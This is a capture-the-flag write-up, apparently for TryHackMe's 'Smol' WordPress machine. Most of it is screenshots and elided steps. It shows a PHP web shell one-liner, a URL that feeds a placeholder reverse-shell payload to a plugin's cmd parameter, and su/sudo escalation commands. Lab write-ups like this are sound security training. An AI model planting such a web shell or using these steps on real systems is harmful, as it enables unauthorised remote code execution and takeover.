---
title: SMOL- THM CVE-2018-20463
date: '2025-12-08'
draft: false
summary: >-
  A comprehensive guide to compromising the Smol machine on TryHackMe,
  demonstrating WordPress exploitation, privilege escalation, and lateral
  movement techniques.
tags:
  - THM
  - Wordpress 
...
status: published
showOnHome: false
createdAt: '2025-12-08T05:18:52.333Z'
updatedAt: '2025-12-08T05:20:34.471Z'
publishedAt: '2025-12-08T05:20:34.471Z'
approvedBy: admin
---
...
```
![image](/static/images/smol-thm-writeup/1765169399436-image.png)
...
![image](/static/images/smol-thm-writeup/1765169349499-image.png)
...
```
![image](/static/images/smol-thm-writeup/1765169466530-image.png)
...
```
![image](/static/images/smol-thm-writeup/1765169489386-image.png)
...
![image](/static/images/smol-thm-writeup/1765169574926-image.png)
...
![image](/static/images/smol-thm-writeup/1765169843190-image.png)
...
![image](/static/images/smol-thm-writeup/1765170142537-image.png)
...
![image](/static/images/smol-thm-writeup/1765170205068-image.png)


```php
system($_GET['cmd']);
```
![image](/static/images/smol-thm-writeup/1765170243633-image.png)
...
2. Generated a reverse shell payload using an online generator

3. Executed the payload via the vulnerable parameter:
```
http://smol.thm/wp-content/plugins/hello.php?cmd=<reverse-shell-payload>
```

4. Successfully caught the connection and upgraded the shell:
```bash
...
```
![image](/static/images/smol-thm-writeup/1765170404181-image.png)
...
su - diego
```
![image](/static/images/smol-thm-writeup/1765170442296-image.png)
...
![image](/static/images/smol-thm-writeup/1765170462592-image.png)
...
sudo su
```
![image](/static/images/smol-thm-writeup/1765170554920-image.png)
